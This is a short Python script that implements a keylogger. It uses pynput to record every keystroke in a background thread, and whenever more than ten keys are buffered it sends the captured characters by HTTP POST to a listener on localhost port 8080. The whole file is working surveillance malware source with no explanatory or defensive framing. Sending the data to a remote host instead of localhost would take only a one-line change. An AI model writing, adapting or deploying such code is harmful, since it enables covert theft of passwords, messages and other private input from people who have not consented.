import requests
from pynput import keyboard
from threading import Thread, Lock
import sys


class KeyLogger:
    def __init__(self):
        self.data_collection = []
        self.lock = Lock()

    def on_press(self, key):
        with self.lock:
            self.data_collection.append(key)

    def apply_keylogger(self):
        with keyboard.Listener(
                on_press=self.on_press,
        ) as listener:
            listener.join()


def save_keys():
    keylogger = KeyLogger()
    keylogger_thread = Thread(target=keylogger.apply_keylogger)
    keylogger_thread.start()
    try:
        while True:
            with keylogger.lock:
                if len(keylogger.data_collection) > 10:
                    data = [k.char for k in keylogger.data_collection if hasattr(k, 'char')]
                    print(data)
                    requests.post('http://localhost:8080/', data=''.join(data).encode('utf-8'))
                    keylogger.data_collection.clear()
    except KeyboardInterrupt:
        print("Exiting...")
        sys.exit()


if __name__ == '__main__':
    save_keys()